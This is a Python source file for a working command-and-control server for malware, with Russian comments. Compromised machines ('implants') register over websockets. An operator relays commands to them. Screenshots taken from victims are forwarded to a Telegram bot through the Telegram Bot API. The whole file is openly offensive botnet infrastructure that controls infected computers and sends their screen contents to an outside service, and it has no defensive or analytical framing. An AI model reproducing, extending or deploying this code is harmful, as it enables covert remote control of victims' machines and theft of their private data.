# --- ФАЙЛ: c2_server.py (Финальный Командный Центр) ---
import asyncio, json, os, threading, urllib.parse
import requests # Нужен для отправки файлов в Telegram
from aiohttp import web
import settings

IMPLANTS, OPERATOR = {}, None

def send_telegram_photo(caption, photo_data):
    """Отправляет base64 изображение в Telegram."""
    def send():
        try:
            # Декодируем base64 строку в байты
            image_bytes = base64.b64decode(photo_data)
            files = {'photo': ('screenshot.jpg', image_bytes, 'image/jpeg')}
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendPhoto"
            data = {'chat_id': settings.CHAT_ID, 'caption': caption}
            requests.post(url, data=data, files=files, timeout=20)
        except Exception as e:
            print(f"[!] Ошибка отправки фото в Telegram: {e}")
    # Запускаем в отдельном потоке, чтобы не блокировать сервер
    threading.Thread(target=send, daemon=True).start()

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        await OPERATOR.send_json({'type': 'bot_list', 'data': [{'id': bot_id} for bot_id in IMPLANTS.keys()]})

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)
    client_type, client_id = None, None

    try:
        initial_msg = await ws.receive_json(timeout=30.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator': OPERATOR = ws; await broadcast_bot_list()
        elif client_type == 'implant': client_id = initial_msg.get('id'); IMPLANTS[client_id] = ws; await broadcast_bot_list()
        else: await ws.close(); return ws

        async for msg in ws:
            if msg.type != web.WSMsgType.TEXT or msg.data == 'pong': continue
            try: data = json.loads(msg.data)
            except: continue

            if client_type == 'operator':
                target_id = data.get('target_id')
                if target_id in IMPLANTS and not IMPLANTS[target_id].closed:
                    if data.get('type') == 'command': await IMPLANTS[target_id].send_json(data.get('payload'))
                    else: await IMPLANTS[target_id].send_json(data)

            elif client_type == 'implant':
                data['bot_id'] = client_id # Добавляем ID бота ко всем ответам

                # <<< ГЛАВНАЯ ЛОГИКА ОБРАБОТКИ СКРИНШОТА >>>
                if data.get('type') == 'screenshot_result' and data.get('data'):
                    print(f"[+] Получен скриншот от {client_id}. Отправка в Telegram...")
                    send_telegram_photo(f"📸 Скриншот от {client_id}", data['data'])
                if OPERATOR and not OPERATOR.closed:
                    await OPERATOR.send_json(data)

    except Exception: pass
    finally:
        if client_type == 'implant' and client_id in IMPLANTS: del IMPLANTS[client_id]; await broadcast_bot_list()
        elif client_type == 'operator': OPERATOR = None
    return ws

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

app = web.Application(); app.router.add_get('/', http_handler); app.router.add_get('/ws', websocket_handler)
if __name__ == "__main__":
    import base64
    web.run_app(app, host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
